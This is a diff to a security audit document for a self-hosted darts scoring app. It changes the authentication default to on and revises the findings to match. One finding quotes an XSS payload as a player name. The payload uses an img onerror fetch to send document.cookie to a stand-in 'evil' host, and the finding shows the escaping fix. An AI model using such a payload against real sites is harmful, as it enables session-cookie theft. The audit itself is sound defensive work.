@@ -53,9 +53,12 @@ the service down, (3) stats must stay accurate. There is only one class of crede
 These were found and fixed in the audit that produced this doc. Listed so a follow-up
 model doesn't re-report them. See `docs/security-hardening-roadmap.md` for detail.
 
-- **Unauthenticated write endpoints** → `OCHE_REQUIRE_AUTH` env flag + `requireWrite()`
-  gate on every write route in `server.js`. Reads stay public. `GET /api/auth-config`
-  reports the flag; frontend prompts for login before gameplay/roster writes.
+- **Unauthenticated write endpoints** → `OCHE_REQUIRE_AUTH` env flag (zero-trust
+  default: on) + `requireWrite()` gate on every write route in `server.js`. Reads
+  stay public. `GET /api/auth-config` reports the flag; frontend prompts for login
+  before gameplay/roster writes (routing to the setup wizard first if no admin
+  account exists yet). Set `OCHE_REQUIRE_AUTH=false` to opt back into open-LAN
+  behavior for a fully-trusted household network.
 - **Player PINs enforced only in the UI** (a direct `POST /api/games/:id/turns` scored
   as a PIN-protected player) → mitigated by the auth gate above (PINs remain a UI
   convenience only; this is by design now, documented).
@@ -304,28 +307,31 @@ container. Any RCE (now or from a future dependency) would start as root.
 ### SEC-6 — Secure defaults not surfaced for public deployment  **(LOW→MED)**
 
 **Status: ✅ Fixed.** `docker-compose.yml`, `docker-compose.dev.yml`, and
-`docker-compose.portainer.yml` all now document (commented, default-off/unset)
-`OCHE_REQUIRE_AUTH`, `TRUST_PROXY`, and `HA_BLOCK_PRIVATE` with explanations of when to
-set each. `README.md` has a new "Exposing this to the internet — checklist" section
-covering all of the above plus the reverse-proxy/`COOKIE_SECURE` guidance, the
-non-root container, and the security response headers (all on by default, nothing to
-configure). Step 3 (log a warning when `COOKIE_SECURE` is false but the request looks
-like HTTPS via `X-Forwarded-Proto`) was **not** implemented — it's speculative
-(marked "Optional" in the fix sketch) and would require deciding whether to trust
-`X-Forwarded-Proto` by default, which has the same spoofing consideration as
-`X-Forwarded-For`/`TRUST_PROXY`; left as a possible future addition rather than guessed
-at here.
+`docker-compose.portainer.yml` all now document `OCHE_REQUIRE_AUTH`, `TRUST_PROXY`,
+and `HA_BLOCK_PRIVATE` with explanations of when to set each. `README.md` has a new
+"Exposing this to the internet — checklist" section covering all of the above plus
+the reverse-proxy/`COOKIE_SECURE` guidance, the non-root container, and the security
+response headers (all on by default, nothing to configure). Step 3 (log a warning
+when `COOKIE_SECURE` is false but the request looks like HTTPS via
+`X-Forwarded-Proto`) was **not** implemented — it's speculative (marked "Optional" in
+the fix sketch) and would require deciding whether to trust `X-Forwarded-Proto` by
+default, which has the same spoofing consideration as `X-Forwarded-For`/
+`TRUST_PROXY`; left as a possible future addition rather than guessed at here.
+**Follow-up (2026-07): `OCHE_REQUIRE_AUTH` itself flipped from default-off to a
+zero-trust default-on** — see the top-level Part 1 bullet above and
+`docs/security-hardening-roadmap.md`; the compose files and README now reflect the
+new default, with `OCHE_REQUIRE_AUTH=false` as the documented opt-out.
 
-**Where:** `docker-compose.yml` sets `COOKIE_SECURE=false` and does not mention
-`OCHE_REQUIRE_AUTH` at all; there is no TLS in-app (relies on a reverse proxy).
+**Where (historical, at the time this finding was opened):** `docker-compose.yml` set
+`COOKIE_SECURE=false` and did not mention `OCHE_REQUIRE_AUTH` at all; there was no TLS
+in-app (relies on a reverse proxy).
 
-**Fix (step by step):**
-1. Add `OCHE_REQUIRE_AUTH` to the compose `environment:` block (commented, default
-   `false`) with a note: "set true for any internet-exposed deployment."
+**Fix (step by step, as originally scoped):**
+1. Add `OCHE_REQUIRE_AUTH` to the compose `environment:` block with a note about when
+   to set it.
 2. Add a short "Exposing this to the internet" checklist to `README.md`: put it behind a
-   TLS-terminating reverse proxy, set `COOKIE_SECURE=true`, set `OCHE_REQUIRE_AUTH=true`,
-   set `TRUST_PROXY=true` (SEC-3) only if the proxy is trusted, and restrict the exposed
-   port to the proxy.
+   TLS-terminating reverse proxy, set `COOKIE_SECURE=true`, set `TRUST_PROXY=true`
+   (SEC-3) only if the proxy is trusted, and restrict the exposed port to the proxy.
 3. Optional: if `COOKIE_SECURE` is false but the request arrived over HTTPS (via
    `X-Forwarded-Proto`), log a one-time warning.
 
@@ -550,8 +556,8 @@ player-list/profile handlers at lines ~3014, ~3118, ~6176) — this one site is 
 outer `escapeHtml`, so it's inconsistent with the file's own established safe pattern.
 
 **Attack:** player names have **no charset restriction** server-side (`addPlayer()` in
-`db.js` only does `String(name).trim()` + non-empty). In the default `OCHE_REQUIRE_AUTH`
--off config, **anyone** can `POST /api/players` with a name like:
+`db.js` only does `String(name).trim()` + non-empty). With `OCHE_REQUIRE_AUTH=false`
+(the open-LAN opt-out), **anyone** can `POST /api/players` with a name like:
 
 ```
 x"><img src=x onerror=fetch('//evil/'+document.cookie)>
@@ -568,9 +574,10 @@ privilege escalation. (Verified by reproducing the exact rendered string: the cu
 helper emits a live `<img onerror>`; `escapeHtml(escapeJs(n))` renders it inert as
 `&quot;&gt;&lt;img...&gt;`.)
 
-Note: with `OCHE_REQUIRE_AUTH=true`, only admins can create players, so the cross-privilege
-angle narrows — but the fix is trivial and defense-in-depth says escape regardless (a name
-could have been planted before auth was enabled).
+Note: under the zero-trust default (`OCHE_REQUIRE_AUTH=true`), only admins can create
+players, so the cross-privilege angle narrows — but the fix is trivial and
+defense-in-depth says escape regardless (a name could have been planted before auth
+was enabled, or under the `false` opt-out).
 
 **Fix (step by step):**
 1. In `renderPinPlayersList()`, change both handlers to the same pattern the rest of the
@@ -672,8 +679,8 @@ client can write junk that pollutes stats/leaderboards or grows the DB:
 
 **Attack:** none of these is a takeover or injection path; the impact is (a) corrupted /
 spammable stats and badges, and (b) unbounded table growth from an unauthenticated source
-when `OCHE_REQUIRE_AUTH` is off. The global 300-req/60s/IP limiter (SEC-3) bounds the *rate*
-but not the *total*, and multiple IPs bypass the per-IP cap.
+when `OCHE_REQUIRE_AUTH=false` (the open-LAN opt-out). The global 300-req/60s/IP limiter
+(SEC-3) bounds the *rate* but not the *total*, and multiple IPs bypass the per-IP cap.
 
 **Fix (step by step):**
 1. `awardBadge`/`revokeBadge`: validate `badgeId` against the known badge-id set (the same
@@ -687,8 +694,8 @@ but not the *total*, and multiple IPs bypass the per-IP cap.
    known formats; reject otherwise with 400.
 4. `recordEvent`: whitelist `eventType` against the known event types.
 5. Broadly: the single biggest lever for an internet-exposed box is
-   `OCHE_REQUIRE_AUTH=true` (already the SEC-6 checklist recommendation) — with it on,
-   every write above requires an admin session, which removes the anonymous-pollution
+   `OCHE_REQUIRE_AUTH` staying at its zero-trust default (on) — with it on, every
+   write above requires an admin session, which removes the anonymous-pollution
    angle entirely. These per-field validations are defense-in-depth on top of that.
 
 **Verify:** an award with a made-up `badgeId`, a `createGame` with `gameType:'evil'`, and a
@@ -698,15 +705,16 @@ but not the *total*, and multiple IPs bypass the per-IP cap.
 
 ### Residual risk reaffirmed (not a new finding)
 
-In the **default** `OCHE_REQUIRE_AUTH`-off configuration, every write endpoint (including
-`POST /api/live`, which re-broadcasts to all `/display` screens) is unauthenticated — an
-attacker on the network can inject fake games, spam stats, or hijack the scoreboard
-"billboard" (the payload is key-whitelisted and size-capped by `sanitizeLiveState`, and
-`display.html` escapes every field, so this is annoyance, not XSS). This is the documented
-open-LAN trade-off (see the threat model at the top). For any internet-exposed deployment
-the mitigation is the SEC-6 checklist — chiefly `OCHE_REQUIRE_AUTH=true` behind a
-TLS-terminating reverse proxy. Reaffirming it here so a future reader doesn't mistake the
-auth-off default for an oversight.
+**Only under the documented opt-out** (`OCHE_REQUIRE_AUTH=false`, for a fully-trusted
+household LAN), every write endpoint (including `POST /api/live`, which re-broadcasts to
+all `/display` screens) is unauthenticated — an attacker on the network can inject fake
+games, spam stats, or hijack the scoreboard "billboard" (the payload is key-whitelisted
+and size-capped by `sanitizeLiveState`, and `display.html` escapes every field, so this
+is annoyance, not XSS). This is the documented open-LAN trade-off (see the threat model
+at the top), not something that happens under the zero-trust default. For any
+internet-exposed deployment the mitigation is simply leaving `OCHE_REQUIRE_AUTH` at its
+default (`true`) behind a TLS-terminating reverse proxy — see the SEC-6 checklist.
+Reaffirming it here so a future reader doesn't mistake the opt-out for an oversight.
 
 ## Suggested order for Part 4
 
